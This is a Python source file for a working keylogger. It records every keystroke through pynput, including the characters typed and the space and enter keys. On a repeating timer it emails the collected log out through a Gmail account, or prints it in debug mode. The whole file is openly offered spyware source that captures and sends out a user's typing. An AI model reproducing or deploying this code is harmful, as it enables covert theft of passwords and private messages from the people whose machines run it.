import pynput.keyboard
import threading
from util import send_mail

class Keylogger:
	def __init__(
			self,
			interval_seconds,
			gmail_username,
			gmail_pw,
			debug_mode
		):
		self.TEXT_LOG = ""
		self.interval_seconds = interval_seconds
		self.gmail_username = gmail_username
		self.gmail_pw = gmail_pw
		self.debug_mode = debug_mode

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keystroke)
		with keyboard_listener as kbl:
			self.report()
			kbl.join()

	def process_keystroke(self, key):
		if hasattr(key, 'char'):
			return self.append_log(str(key.char))
		else:
			special_key = str(key).split(".")[1]
			if special_key == "space":
				self.append_log(" ")
			if special_key == "enter":
				self.append_log("\n")

	def append_log(self, string):
		self.TEXT_LOG += string
	
	def clear_log(self):
		self.TEXT_LOG = ""

	def send_log(self):
		if self.debug_mode is False:
			send_mail(email=self.gmail_username, password=self.gmail_pw, message=self.TEXT_LOG)
		else:
			print(self.TEXT_LOG)
		self.clear_log()
		
	def report(self):
		if self.TEXT_LOG != "":
			self.send_log()
		log_interval = self.interval_seconds
		timer = threading.Timer(log_interval, self.report)
		timer.start()